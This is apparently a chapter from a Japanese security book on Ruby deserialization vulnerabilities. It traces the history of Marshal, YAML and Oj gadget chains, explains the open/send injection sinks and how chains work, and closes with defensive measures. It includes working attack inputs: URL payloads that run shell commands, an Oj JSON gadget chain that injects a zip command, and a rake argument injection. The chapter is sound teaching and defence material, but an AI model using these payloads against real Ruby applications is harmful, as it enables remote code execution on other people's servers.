つまり `Marshal.load(untrusted_bytes)` を呼ぶという行為自体が、「攻撃者が選んだクラスの、攻撃者が選んだメソッドを、攻撃者が用意した引数付きで呼び出す」というリモートコード実行の入口（sink：入力が最終的に危険な形で処理・実行される到達点）になり得る。これは「デシリアライズが常に危険」という話ではなく、Rubyの標準ライブラリやRubyGems・Railsといったエコシステムの中に、`marshal_load`/`_load`/`init_with` を実装しているクラスが多数存在し、その中にファイルオープン・コマンド実行・正規表現評価などの「危険な副作用」を持つものが混ざっている、という点が本質である。攻撃者はそれらのクラスを鎖のようにつなぎ合わせ（ガジェットチェーン：無害に見える既存コードの断片を連結して最終的に任意コード実行に到達させる攻撃手法）、最終的に `system()` や `eval` 相当の実行に到達させる。

Trail of Bitsの記事は、この前提を明確に述べている。

> "passing untrusted input to `Marshal.load` should be considered an arbitrary code execution vulnerability"（信頼できない入力を `Marshal.load` に渡すことは、任意コード実行脆弱性とみなすべきである）

> 出典: Trail of Bits: Marshal madness — A brief history of Ruby deserialization exploits — https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/

これはJavaの `ObjectInputStream.readObject()` が抱える問題（本書第3章）と同型の構造であり、「デシリアライズ処理自体がクラス選択と副作用の実行権限を攻撃者に渡してしまう」という設計欠陥がRubyにも存在することを示している。

### 歴史：2013年の最初の警鐘から現在まで

Rubyのデシリアライゼーション問題は突然発見されたものではなく、長い前史がある。

**2013年1月31日**：Charlie SomervilleがRubyの公式バグトラッカーで `Marshal.load` の危険性を報告した。この時点ではまだエコシステム全体を揺るがす実証コードは存在しなかったが、問題の所在自体は明確に指摘されていた。

**2016年**：セキュリティ研究誌「Phrack」第69号にjörnchenが寄稿し、Marshalデシリアライゼーションの悪用手法を詳述した。この記事では「Rails 4.1以降ではデフォルトの挙動を変更しない限りこの手法はパッチ済みである」ことにも言及されており、当時すでにフレームワーク側の部分的な緩和策が存在していたことが分かる。

**2018年11月**：Luke Jahnkeが、Ruby 2.x系列全体に有効な「universal（汎用）」ガジェットチェーンを発表した。ここでいう「universal」とは、特定のアプリケーションのコードに依存せず、Ruby標準ライブラリやRubyGemsに標準で含まれるクラスだけで組み立てられるという意味であり、対象がRubyそのものであるため影響範囲が非常に広い。

**2019年1月〜3月**：ooooooo_qらの研究により、Rails 5.2を対象とした具体的な脆弱性がCVE-2019-5420として報告された。Rails 5.2.2.1以降で修正されている。

**2021年1月**：William Bowlingが、Ruby 2.x〜3.xにまたがる新たな汎用ガジェットチェーンを公開した。この問題はRuby 3.1.0で修正された。Bishop Foxの記事によれば、このチェーンはBase64エンコードされたペイロードを扱い、Railsアプリケーションに対しては復元後の値をハッシュテーブルでラップする必要があった。

```ruby
Marshal.load(Base64.decode64(params[:base64binary]))
```

> 出典: Bishop Fox: Ruby Vulnerabilities — Open, Send, Deserialization — https://bishopfox.com/blog/ruby-vulnerabilities-exploits

**2022年3月〜4月**：Harsh JaiswalとRahul Mainiが、`ActiveRecord::Associations::Association` クラスを利用した新チェーンを発表した。このチェーンはBowlingの手法が修正された後のRuby 3.1.1環境でも動作するとされ、「ある脆弱なクラスが塞がれても、別の標準ライブラリ・Gemの中に同種の危険なフックを持つクラスが存在する限り、攻撃者は組み替えて再び到達する」というガジェットチェーン攻撃特有のいたちごっこを象徴する事例となった。Bowlingの側もこれを受けて更新版チェーンを公開し、Ruby 3.2.0で修正された。

**2024年**：この年は複数の研究が集中した年である。

- 2024年3月、Include SecurityがCodeQLを用いた静的解析でガジェット候補を体系的に検出する手法を発表した。
- 2024年6月、GitHub Security Labが、JSON・XML・YAML・Marshalという複数のシリアライズ形式を横断してRubyのデシリアライゼーション脆弱性を分析した報告を公開した。
- 2024年10月〜11月、Leonardo GiovanniniとLuke Jahnkeが、それぞれ独立にRuby 3.4に対応する新しいガジェットを発見した。
- 2024年12月、Ruby 3.4のリリース候補（rc1）の中に「16年間未修正のまま残っていたコードパス」が発見され、修正された。

> 出典: Trail of Bits: Marshal madness — A brief history of Ruby deserialization exploits — https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/

この年表が示す教訓は、「Marshalの脆弱性は特定バージョンのバグではなく、`Marshal` というフォーマットの設計そのものに起因する構造的な問題」だということである。個別のガジェットクラスをパッチしても、RubyGemsやRailsのエコシステムは巨大であり、新しい「危険なフックを持つクラス」が継続的に見つかる。Trail of Bitsはこの状況を踏まえ、Rubyコアチームに対して次のような段階的な廃止プロセスを提言している。

1. プリミティブ型のみを安全に復元する `Marshal.safe_load` の実装
2. `Marshal.load` 呼び出し時に実行時警告を出す
3. 将来のバージョンで `Marshal.load` を `Marshal.unsafe_load` に改称する
4. 最終的に安全でない挙動を廃止する

記事はさらに「Go言語やRustにこの種のバグが存在しないのには理由がある」("There's a reason Go and Rust do not have these types of bugs")と述べ、実行時の型情報だけでなく静的な型システムやシリアライズ設計そのものが安全性に直結することを強調している。

### Open・Sendを起点とする副次的な攻撃経路

Ruby特有のもう一つの危険な設計として、Bishop Foxの記事は「デシリアライズそのもの」ではなく「デシリアライズと組み合わさりやすい危険なメソッド」を2つ取り上げている。これらは単独でもコマンドインジェクションの原因になるが、後述のガジェットチェーンの内部でも実行到達点（sink）として使われることがある。

#### Kernel#open のパイプ実行

```ruby
open(params[:path_or_url])
```

Rubyの `open`（`Kernel#open` あるいは `open-uri` 経由）は、引数がファイルパスやURLだけでなく「先頭が `|`（パイプ文字）で始まる文字列」の場合、それをシェルコマンドとして実行するという歴史的な仕様を持つ。これは元々「`open("|ls")` でコマンドの出力をIOのように扱える」という利便性のための機能だが、ユーザー入力をそのまま渡すコードでは深刻な脆弱性になる。

```
http://127.0.0.1:3000/?path_or_url=|date>>/tmp/rce1.txt
```

なぜこれが動くのかというと、`open` の実装内部でパイプ記法を検出するチェックが「入力の解釈方法を決めるための分岐」として組み込まれており、呼び出し側がその意図を知らずにユーザー制御文字列をそのまま渡すと、パーサ（構文解析器）が誤ってシェルコマンドとして解釈してしまうためである。

#### Object#send / public_send による任意メソッド呼び出し

`send` はRubyのメタプログラミング（プログラムが自分自身の構造を操作する仕組み）を支える基本機能で、メソッド名を文字列やシンボルとして動的に指定して呼び出すことができる。これがユーザー入力に依存すると、任意のメソッドを呼べる「任意メソッド呼び出し」脆弱性になる。

```ruby
send(params[:send_method_name], params[:send_argument])
```

```
http://127.0.0.1:3000/?send_method_name=eval&send_argument=`date>>/tmp/rce5.txt`
```

またSplat演算子（配列を個別の引数として展開する `*` 演算子）を使った形式も同様に危険である。

```ruby
send(*params[:send_value])
```

```
http://127.0.0.1:3000/?send_value[]=eval&send_value[]=`date>>/tmp/rce6.txt`
```

一見安全に見える `public_send`（`private`/`protected` メソッドの呼び出しを拒否する `send` の亜種）も、"`public_send`はprivateメソッドのみを制限するが、`instance_eval` が公開メソッドとして利用可能であるため同様に危険"であるとBishop Foxは指摘している。つまり `private` を付ければ安全という単純な話ではなく、公開APIとして到達可能な危険メソッド（`eval` 系や `instance_eval` など）そのものを塞ぐ必要がある。

> 出典: Bishop Fox: Ruby Vulnerabilities — Open, Send, Deserialization — https://bishopfox.com/blog/ruby-vulnerabilities-exploits

### YAML・Ojを介したデシリアライゼーション

Marshalに限らず、RubyアプリケーションではYAMLやOj（高速なJSONパーサGem）を介したデシリアライズも広く行われており、これらにも同種の危険性がある。

#### YAML（Psych）

Rubyの標準YAMLライブラリはPsychと呼ばれる。psych 4.0未満では `YAML.load()` が信頼できない入力に対して脆弱であり、psych 4.0以降ではデフォルトの `YAML.load` が安全側に倒された代わりに、明示的に危険な `YAML.unsafe_load()` を呼んだ場合に同様の脆弱性が再現する。

Bowlingのガジェットチェーンは単純にYAML化しただけでは動作せず、"`Gem::Requirement` オブジェクトをハッシュキーとして使用する必要がある"という制約がある。これはYAMLのハッシュ復元処理が、キーオブジェクトに対して `.each()` のようなメソッドを呼び出す過程を利用するためで、Maini・Jaiswalのチェーンではこの制約を踏まえた上で、最終的にERB（Rubyの組み込みテンプレートエンジン、詳細は本章SSTIの節を参照）テンプレートインジェクション経由でシステムコマンドを実行する構成が使われている。ペイロード中では文字コード制限を回避するために `62.chr`（文字コード62に対応する `>` を動的に生成する）といった手法も使われる。

#### Oj（Object marshalling for JSON）

Ojは8つの動作モード（`compat`、`custom`、`json`、`null`、`object`、`rails`、`strict`、`wab`）を持つが、このうち**`object`モードのみ**が任意オブジェクト復元を許すため脆弱である。

```ruby
Oj.load(params[:json])
```

`object`モードでのペイロードは、YAMLと同様にガジェットをハッシュキーとして配置する形式を取る（例: `{"^#1":[[...], "dummy_value"]}`)。ここで注意すべきは、アプリケーション自身が明示的に `object` モードを指定していなくても、依存しているGem（例として `rabl 0.14.5` のような古いバージョン）が `Oj.default_options = {:mode => :compat}` のようにグローバル設定を書き換えているケースがあり、意図せず安全なはずの `compat` モードへ切り替わっている、あるいは逆に別のGemが `object` モードに戻してしまう、という「グローバル設定の奪い合い」がリスクになる点である。

> 出典: Bishop Fox: Ruby Vulnerabilities — Open, Send, Deserialization — https://bishopfox.com/blog/ruby-vulnerabilities-exploits

### Ruby 3.4向け最新チェーン（Luke Jahnke, 2024年後半）

前述の歴史の最終局面として、Luke Jahnkeが公開したRuby 3.4対応の汎用ガジェットチェーンは、これまでのチェーンがバージョンアップにより無効化されていく中で、どのように攻撃者側が「新しい未使用のガジェット」を発掘していくかを示す好例である。

#### 改善点1：依存ライブラリの自動読み込みを利用する

従来のチェーンは、攻撃対象のプロセスが事前に `uri` ライブラリなどを `require` 済みであることを前提にしていた（ガジェットチェーンは、攻撃者が用意したペイロード自体はコードを含まず、あくまで「既にロード済みのクラス」だけを組み合わせるため、対象クラスが読み込まれていなければ攻撃は成立しない)。Jahnkeのチェーンでは、`Gem::SpecFetcher` が自動読み込み（autoload）登録されている性質を利用し、`Gem::SpecFetcher → Gem::RemoteFetcher → Gem::Request → Gem::Net → Gem::URI` という連鎖でオンデマンドに必要なクラスを読み込ませる。これにより、対象プロセスが事前に何をrequireしているかという前提条件を減らし、より多くの実環境で成立する「汎用性」を高めている。

#### 改善点2：コマンド実行の起点を rake / make に変更

最終的なコマンド実行（sink）として、公式Rubyのコンテナイメージに標準で含まれる `rake` や `make` を利用する。これらはコマンドライン引数（ARGV）を制御できれば起動できるため、ガジェットチェーンが最終的に「特定のプロセスを、攻撃者が指定した引数付きで起動する」形に到達しさえすれば実行可能になる。記事で示されている例は次のような形である。

```
rake rev-parse '-p`/bin/id 1>&0`'
```

ここでのポイントは、`rake` 自体に脆弱性があるのではなく、ガジェットチェーンが「任意のコマンドを任意の引数付きで起動できる」状態まで到達した後、実際にOSコマンドとして意味のある形に整形するために `rake`/`make` を「都合の良い実行バイナリ」として利用しているという点である。これはOSコマンドインジェクション（第◯章参照）の考え方とも接続しており、「デシリアライズガジェットチェーンの最終到達点は、結局のところOSコマンド実行や既存の危険シンクである」という共通パターンを示している。

#### 改善点3：例外処理の回避

`Gem::Version` クラスは、バージョン文字列を正規表現でパースしようとして失敗すると例外を送出する。この例外がチェーンの途中で発生すると復元処理全体が中断してしまうため、Jahnkeのチェーンでは `UncaughtThrowError`（Rubyの `throw`/`catch` 機構に対応する特殊な例外）をラッパーとして利用し、意図的にコントロールフローを分岐させることでこの例外を無害化している。さらに `%.0s` というフォーマット指定子（文字列を0文字に切り詰める）を使い、戻り値を空文字列に変換した上で続けてバージョン文字列としてマッチさせる、という細かい手法でパーサの検証を通過させている。

このチェーンは、記事内で `call_url_and_create_folder()`（ネットワーク要求を発生させるガジェット）、`git_gadget()`（Gitコマンドを実行させるガジェット）、`command_gadget()`（最終的な任意コマンド実行ペイロードを構成する部分）という3つの機能に分けて構成されており、それぞれが「一つ前のガジェットが到達した状態」を次のガジェットへの入力として引き継ぐ多段構造になっている。

> ⚠️ **未取得の資料（部分）**: nastystereo.comの記事本文は自動取得できましたが、実際のバイト列・完全なペイロードコード全文、対象となる正確なRubyバージョン範囲、CVE番号の記載は要約抽出の範囲では確認できませんでした。正確なバージョン境界や完全なペイロードが必要な場合は、以下のURLからご自身で直接ご確認ください: https://nastystereo.com/security/ruby-3.4-deserialization.html
>
> （以下は未取得資料の補足として一般知識に基づく解説です）Ruby本体側では、Marshalフォーマットのデータに対して「復元対象クラスをアプリケーション側で許可リストにより制限する」という緩和策が一般的に推奨されている。ただしMarshalには標準でそのような許可リスト機構（YAMLの `permitted_classes` に相当するもの）が用意されていないため、実務上は「そもそも信頼できない入力を `Marshal.load` に渡さない」という設計上の回避が最も確実な対策となる。

> 出典: nastystereo (Luke Jahnke): Ruby 3.4 Universal RCE Deserialization Gadget Chain — https://nastystereo.com/security/ruby-3.4-deserialization.html

### 防御のまとめ

以上の歴史とチェーンの構造から導かれる実務的な防御指針は次の通りである。

1. **信頼できない入力を `Marshal.load` / `YAML.unsafe_load` / `Oj.load`（`object`モード）に渡さない。** これが唯一の確実な対策であり、パッチ済みガジェットを個別に塞ぐアプローチは新しいガジェットの発見によって継続的に破られてきた（本節の年表を参照）。
2. **YAMLは `YAML.safe_load` またはpsych 4.0以降のデフォルト `YAML.load`（許可クラスを明示的に指定する）を使う。** 任意クラスの復元を許す `unsafe_load` は避ける。
3. **Ojは常にモードを明示的に指定する**（例: `Oj.load(params, options: {:mode => :compat})`）。他のGemによるグローバル設定の書き換えに注意し、依存関係の変更時にモードが変わっていないか確認する。
4. **`open` にユーザー入力をそのまま渡さない**。パイプ記法によるコマンド実行を避けるため、`URI.open` や明示的なファイルパス検証を用いる。
5. **`send` / `public_send` / `instance_eval` にユーザー入力由来のメソッド名を渡さない**。動的メソッドディスパッチが必要な場合は、許可するメソッド名の集合をホワイトリストとして明示的にチェックする。
6. **静的解析ツール（Brakemanなど）をCIに組み込み**、`Marshal.load`・`YAML.load`・`Oj.load` の危険な呼び出しパターンを継続的に検出する。
7. **コードレビューでシリアライズ形式の選定自体を疑う**。可能であれば、任意クラス復元を必要としないJSON（標準ライブラリのみを使い、独自の `json_create`／`init_with` フックを実装したクラスを持ち込まない）やProtocol Buffers、MessagePackのような、復元時に任意メソッド呼び出しを伴わない形式へ移行することが根本的な解決になる。

Rubyのデシリアライゼーション問題が示す最大の教訓は、「特定のガジェットクラスをパッチする」という対症療法では攻撃者の後追いにしかならず、"信頼できない入力を復元する"という行為そのものを設計レベルで避ける以外に、恒久的な解決策は存在しないという点である。

## RubyのJSON経由デシリアライゼーションとPoC集

### 導入: なぜ「JSONを送るだけ」でコマンド実行が起きるのか

Ruby系のWebアプリケーションでは、JSONやYAMLといった一見無害なデータ形式を「デシリアライズ（直列化されたバイト列やテキストを、元のオブジェクト構造に復元する処理）」する際に、単なるデータではなく**任意のクラスのインスタンス**を復元してしまうライブラリが存在する。攻撃者はこの仕組みを悪用し、正規のJSON入力欄（フォーム、API、Cookie、キャッシュ等）に細工したペイロードを送るだけで、サーバー上で任意のシェルコマンドを実行できる。

この章では、GitHub Security Labが公開した実証研究、実際に動作するPoC（Proof of Concept）リポジトリ、そしてRailsエコシステム全体をCodeQL的な手法（コード中のパターンマッチによる危険なsink探索）でスキャンした個人研究者のブログを軸に、「なぜ動くのか」という仕組みのレベルから解説する。

---

### 1. Rubyのデシリアライズが危険になる根本原因

まず前提として、Rubyのデシリアライザ（`Marshal.load`、`YAML.unsafe_load`、`Oj.load` など）は、JSONやYAMLのテキストから**任意のクラスのオブジェクトを、`initialize`メソッドを呼ばずに直接生成する**という共通の特徴を持つ。

> （以下は未取得資料の補足を含む、取得できた記事群の内容に基づく一般的な解説です）

通常Rubyでは `SomeClass.new(args)` のように、コンストラクタである `initialize` を経由してインスタンスを生成する。ここでは開発者が書いたバリデーション（型チェック、範囲チェックなど）が必ず通る。ところがデシリアライザは、シリアライズされたバイト列やハッシュ構造から「このインスタンス変数（`@foo` のような、オブジェクトが内部的に保持する値）にはこの値を入れる」という復元を行うために、`allocate()`（メモリ上に空のオブジェクトを確保するだけの低レベルAPI）でオブジェクトの箱だけを作り、そこへ**直接インスタンス変数を注入する**。これはRuby自身のブログ記事群が明言している通り、「`initialize`とそれが本来行うはずのバリデーションを一切通らない」ということを意味する。

つまり攻撃者は、アプリケーションの正規のコンストラクタでは絶対に作れないはずの「矛盾した」「攻撃用に汚染された」内部状態を持つオブジェクトを、デシリアライズ経由でサーバー内に直接作り込める。これが「デシリアライゼーション・ガジェットチェーン（gadget chain: 攻撃者が制御できないコードの断片を繋ぎ合わせ、意図しない挙動を連鎖的に引き起こす攻撃手法）」の出発点である。

#### 主要ライブラリごとの危険なsink

GitHub Security Labの記事は、Rubyプロジェクトで見つかる代表的な危険なデシリアライズ経路を次のように整理している。

| ライブラリ | 危険な呼び出し（sink） | 備考 |
|---|---|---|
| Marshal | `Marshal.load(untrusted_data)` | `_load` というマジックメソッドを呼び出して復元する。信頼できない入力に対しては本質的に危険とされる |
| Psych（YAML） | `YAML.load`（旧版）／`YAML.unsafe_load`（現行） | Ruby 3.1以降ではPsych 4.0が同梱され、無印の`YAML.load`はデフォルトで安全なクラスのみに制限されるようになった。任意クラスを許すには明示的に`unsafe_load`を呼ぶ必要がある |
| Oj（JSONライブラリ） | `Oj.load(untrusted_data)`（safe modeを指定しない場合） | デフォルトで任意クラスのインスタンス化に対応。`"^o": "ClassName"` という特殊キーでクラス指定を行う独自拡張構文を持つ |
| 標準JSON gem | `JSON.load` を `json_create` 対応クラスとともに使う場合 | 対応できるクラスが `json_create` クラスメソッドを実装しているものに限定されるため、Oj/Marshal/YAMLに比べてガジェットの選択肢は大きく狭まる |

> 出典: GitHub Security Lab: Execute commands by sending JSON? — https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/

ここで重要なのは、「JSON経由」といっても実体は複数ある点だ。標準ライブラリの `JSON` gemが提供する `JSON.load` は `json_create` という規約に従ったクラスしか復元できないため攻撃面が狭い。一方で人気の高速JSONライブラリ **Oj** は、独自の拡張記法（`^o`でオブジェクト指定、`^c`でクラスそのものを指定）を使い、`safe_load`を明示的に呼ばない限り**任意のRubyクラス**をインスタンス化できてしまう。実務では「JSONだから安全」という思い込みでOjやMarshalベースの内部キャッシュ形式が使われているケースが多く、これが本章の主題である「JSON経由デシリアライゼーション」の核心的な攻撃面になる。

---

### 2. キック起点（kick-off）の仕組み: なぜ「読み込むだけ」でメソッドが呼ばれるのか

デシリアライズされたペイロードがただちにRCEに直結するわけではない。攻撃者が制御できるのは「復元されるオブジェクトの型とインスタンス変数の中身」だけであり、そこから実際にコードが実行されるところまで、複数の正規メソッド呼び出しを**連鎖**させる必要がある。この連鎖の起点を「kick-off（蹴り出し）」と呼ぶ。

GitHub Security Labの記事は、ライブラリごとのkick-offメソッドを次のように整理している。

| ライブラリ | トリガーとなるメソッド | 呼び出される契機 |
|---|---|---|
| Marshal | `_load` | デシリアライズ処理自体のマジックメソッド |
| Oj | `hash` | 復元されたオブジェクトがHashのキーとして使われたとき |
| Ox（XML） | `hash` | 同上 |
| Psych（YAML） | `hash` または `init_with` | 同上、または独自の復元フック |

> 出典: GitHub Security Lab: Execute commands by sending JSON? — https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/

「オブジェクトがHashのキーとして使われたとき `hash` メソッドが呼ばれる」という点が仕組み上の核心である。Rubyの `Hash` は内部的にキーの**同値性判定と再配置**のためにキーオブジェクトの `hash` メソッドを呼ぶ。デシリアライザがJSON/YAMLのハッシュ表現を復元する過程で、攻撃者が「キー位置」に任意クラスのインスタンスを置けると、そのクラスの `.hash` メソッドが**アプリケーションコードが一切介在しない場所で自動的に呼ばれる**。Behrad Taherのブログはこれを「デシリアライザがHashを再構築する際、キーに対して `.hash()` を呼ぶ。配列をキーとして挿入すると `Array#hash` が強制的に発動し、配列の各要素に対して `.hash` を呼び出す ── これはデシリアライズ結果が呼び出し元に返る前に起きる」と説明している。

つまり `.hash` は「攻撃者が直接呼べないが、データ構造の設計上ほぼ確実に呼ばれる」汎用的な踏み台（トランポリン）として機能する。ここから、`.hash` を実装しているクラスの中に「何か危険な処理につながる」ものを探す、というのがガジェットチェーン探索の第一歩になる。

---

### 3. 実例1: 検出専用ガジェットチェーン（RCEなしでの脆弱性証明）

GitHub Security Labの記事では、まずコード実行を伴わない「検出用（detection）」ガジェットチェーンを示している。これは、脆弱性が存在することを外部コールバック（Burp Collaboratorのような、外部からのHTTPリクエストを観測できるサービス）へのHTTPリクエストという形で証明するもので、実運用でのペネトレーションテストにおいて「本番環境を破壊せずに脆弱性の有無を確認する」目的にも使える手法である。

連鎖の流れは次の通りである。

1. **キック起点**: `Gem::Requirement` のインスタンスをHashのキーとして配置する。
2. **橋渡し**: `Gem::Requirement#hash` は内部で、`["~>", INNER_GADGET]` のような形の配列要素に対して `to_s` を呼ぶ。
3. **エスカレーション**: `Gem::RequestSet::Lockfile#to_s` → `spec_groups` を経由して `requests` を列挙する。
4. **URL構築**: `URI::HTTP` に不正な `scheme: "s3"` パラメータを与えることで、URLのパス部分にインジェクションを行う。
5. **実行**: `Gem::RemoteFetcher#fetch_path` が、攻撃者が指定したURLへHTTPリクエストを送信する。

> 出典: GitHub Security Lab: Execute commands by sending JSON? — https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/

この連鎖が示す教訓は、「RubyGemsのパッケージ管理関連クラス（`Gem::Requirement`、`Gem::RequestSet::Lockfile`、`Gem::RemoteFetcher` など）は、標準ライブラリの一部としてほぼ全てのRuby実行環境にロードされているため、application固有のgemに依存せず**普遍的に使えるガジェット源**になる」という点だ。これは後述するPoCリポジトリで「universal gadget chain（普遍的ガジェットチェーン）」と呼ばれる理由でもある。

---

### 4. 実例2: RCEガジェットチェーンと`zip`コマンドを使った回避策

もともとセキュリティ研究者william bowling（vakzz）が発見した `Gem::Source::Git` を使うRuby 2.x/3.x向けの普遍的ガジェットチェーンは、後にRuby 3.2以降で `UTF-8` エンコーディングエラーが原因で動作しなくなった。GitHub Security Labの記事は、この回避策として**zipコマンドの引数注入**を利用した新しいRCE手法を示している。

元のガジェットチェーンは、最終的に外部コマンドを次のような形式で実行する。

```
<binary> rev-parse <second-argument>
```

ここで `<binary>` と `<second-argument>` の両方をある程度攻撃者が制御できるが、「必ず `rev-parse` という固定引数が先頭に来てしまう」という制約がある。通常のgitコマンドではこの制約下で任意コマンド実行に持ち込むのは難しい。そこで記事が示す解法は次の通りである。

1. `rev-parse` という名前の**zipファイル自体**を作成する（これで「第一引数がrev-parseである」という制約を満たしたことになる ── zipコマンドにとって、それは実行するサブコマンド名ではなくファイル名として解釈される）。
2. 実行させたいコマンドを、zipのオプション経由の引数インジェクションとして仕込む:

```
zip rev-parse -TmTT="$(id>/tmp/output)"
```

3. `-TmTT=` というzipのオプション（unzip側のテスト用コマンド実行機能を悪用するもの）に、シェルコマンド `$(id>/tmp/output)` をダブルクォートで包んで渡す。zipはこのファイル名部分をあたかも通常の引数のように処理する過程で、シェル経由でコマンドを実行してしまう。

このテクニックの構造をJSON（Oj向けの`^o`拡張構文）で表現すると、記事は次のようなペイロード構造を示している。

```json
{
  "^o": "Gem::Resolver::SpecSpecification",
  "spec": {
    "^o": "Gem::Resolver::GitSpecification",
    "source": {
      "^o": "Gem::Source::Git",
      "git": "zip",
      "reference": "-TmTT=\"$(COMMAND)\"",
      "root_dir": "/tmp",
      "repository": "anyrepo",
      "name": "anyname"
    }
  }
}
```

なぜこれで任意コマンドが実行できるのかを整理すると、以下の3つの独立した仕組みが重なっている。

- **Ojの`^o`記法**は「このJSONオブジェクトを指定クラスのインスタンスとしてデシリアライズせよ」という命令であり、`initialize`を経由せずにインスタンス変数（`@git`、`@reference`、`@root_dir` 等）へ直接値を注入する（前述の「初期化バリデーション回避」の具体例）。
- **`Gem::Source::Git`**は本来、gitリポジトリをローカルにチェックアウトするために内部で `<git実行ファイル> rev-parse <reference>` のような形式のコマンドを組み立てる。`git`フィールドを`"zip"`に差し替えることで、実行されるバイナリそのものを乗っ取っている。
- **zipコマンドの`-TmTT`オプション**（アーカイブのテスト・整合性検証機能の一種）が、渡された文字列をシェル経由で評価する挙動を持つため、`reference`フィールドに仕込んだシェルコマンドがそのまま実行される。

`{CALLBACK_URL}` や `{ZIP_PARAM}` といったプレースホルダーを実際の値に置換して使う実装は、次節で紹介するPoCリポジトリに収録されている。

> 出典: GitHub Security Lab: Execute commands by sending JSON? — https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/

#### バージョン依存性（陳腐化対策として明記）

- Oj/Ox/Psychを使ったガジェットチェーンは **Ruby 3.3.3（2024年6月時点）** まで動作確認されている。
- Marshalを使ったガジェットチェーンは **Ruby 3.2.4（2024年4月時点）** まで動作確認されているが、Ruby 3.3以降では前述のUTF-8エンコーディングの扱いが変わったため元のvakzzチェーンは崩れる（本記事のzip回避策はその対策として書かれたものである）。
- YAMLについては、Ruby 3.1以降で標準搭載されるPsych 4.0により、無印の `YAML.load` はデフォルトで安全側（許可されたプリミティブ型のみ）に倒されるようになった。ただし `YAML.unsafe_load` を明示的に呼んでいるコードは従来通り無防備である。

このように「どのRubyバージョン・どのgemバージョンで通用する話か」を必ず確認した上で、対象システムの実際のバージョンに当てはめて評価する必要がある。

---

### 5. PoCリポジトリ: `ruby-unsafe-deserialization`

GitHub Security Labは上記の研究成果を、再利用可能なPoC集としてリポジトリに公開している。このリポジトリは「学術研究および効果的な防御技術の開発」を目的として明記されている。

収録されている対象ライブラリと形式は次の4種類である。

1. **Oj**（JSON形式のライブラリ）
2. **Ox**（XML形式のライブラリ）
3. **Psych**（YAML形式のライブラリ）
4. **Marshal**（Ruby独自のバイナリシリアライズ形式）

ディレクトリ構成はライブラリ・対応バージョンごとに分かれている。

```
/marshal
/oj/3.3
/ox/3.3
/yaml/3.3
```

各ディレクトリには前述の「検出用（URLコールバックを発生させるだけ）」と「RCE用（zipコマンドを使う）」の2種類のガジェットチェーンが用意されており、利用者は以下のようなプレースホルダーを実際の値に置き換えるだけで動作を試すことができる（防御目的の検証として、自組織が管理する隔離環境でのみ利用すること）。

- 検出用: `{CALLBACK_URL}` を自分が監視できるコールバック先URLに置換
- RCE用: `{ZIP_PARAM}` を例えば `-TmTT=\"$(id>/tmp/deser-poc)\"any.zip` のような値に置換

これらのガジェットチェーンは、William Bowling氏がRuby 2.x/3.x向けに開発した「普遍的ガジェットチェーン（universal gadget chain）」を土台としている。「普遍的」と呼ばれる理由は、標的アプリケーション固有のgemではなく、Bundlerやパッケージ管理まわりの標準ライブラリ（RubyGems関連クラス群）だけで完結する点にある。つまり、ほぼどのRubyアプリケーションにも共通して仕込める攻撃手法だということだ。

> 出典: GitHubSecurityLab: ruby-unsafe-deserialization — https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization

防御側にとっての実務的な意味は、「自分のアプリケーションが `Oj.load`、`YAML.unsafe_load`、`Marshal.load` のいずれかを、外部から到達可能な入力（JSON API、Cookie、キャッシュシリアライズ、セッションストア等）に対して呼んでいないかを棚卸しし、該当箇所があれば即座にこのPoCで（自組織管理下の検証環境に限り）実証すべき」ということである。

---

### 6. Railsエコシステム全体からガジェットを狩る: CodeQL的アプローチの実践例

前節までのガジェットは主にRubyGems標準クラスを起点にしていたが、Behrad Taherのブログは視点を変え、「Railsを使う実務アプリケーションに実在するgem群の中から、新しいガジェットを発掘する」方法論を示している。この手法は静的解析（コードを実行せずソースコードのパターンを機械的に走査すること）の考え方を、専用ツール（CodeQL）を使わずに素朴なテキスト検索（ripgrep）で近似したものだが、考え方自体はCodeQLのようなデータフロー解析ツールにも通じる汎用的なものである。

#### 手法の骨子

1. **母集団の構築**: Rails本体に加え、Sidekiq、Puma、Devise、Nokogiriなど、実務でよく使われる**131個のgem**をDockerコンテナ内にインストールし、合計**6,921個のRubyソースファイル**を対象母集団とした。
2. **危険パターンの機械的検索**: `ripgrep`（高速な正規表現検索ツール）を使い、「インスタンス変数（`@変数名`。攻撃者がデシリアライズ時に直接注入できる値）が、危険な関数呼び出しの引数にそのまま渡されているコード」を正規表現でパターンマッチした。具体的には次のような検索パターンが例示されている。

```
Open3\.capture3\(@\w+\)
\.send\(@\w+\)
```

なぜこの検索パターンが有効かというと、前述の通りデシリアライザは `initialize` を経由せず**インスタンス変数へ直接値を注入する**ため、「メソッドの引数が定数やローカル変数ではなく、インスタンス変数そのものである」箇所こそが、攻撃者が値を完全制御できる「sink候補」だからである。逆に言えば、通常のバリデーション付きコンストラクタを経由するコードでは、インスタンス変数は常に検証済みの値しか入らないため安全だが、デシリアライズ経路では検証をすべて迂回できてしまう。

#### 発見されたガジェットクラスの内訳

**`ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy`**: このクラスは、自身のインスタンスメソッドをほぼ全て消去（undef）しており、その結果ほとんど全てのメソッド呼び出し（`.hash` を含む）が `method_missing`（Rubyで、存在しないメソッドが呼ばれたときに代わりに実行されるフォールバック処理）にフォールスルーする。この `method_missing` は最終的に `target().__send__(...)` という形で、攻撃者が制御する「送信先オブジェクト」に対して「送信するメソッド名」を動的に呼び出す。これは前節の「`.hash`から始まる連鎖」の起点として理想的な性質を持つ ── なぜなら「メソッド名も送信先も両方攻撃者が指定できる汎用ディスパッチャ」になっているからである。

**`Puma::MiniSSL::Context#key_password`**: 引数を取らないメソッドだが、内部でインスタンス変数 `@key_password_command` を読み取り、それをそのまま `Open3.capture3`（シェルコマンドを実行してその標準出力・標準エラー出力・終了ステータスを取得する標準ライブラリのAPI）に渡す。つまりこのメソッドが呼ばれた時点で、攻撃者が設定した `@key_password_command` の中身がシェルコマンドとして実行される。

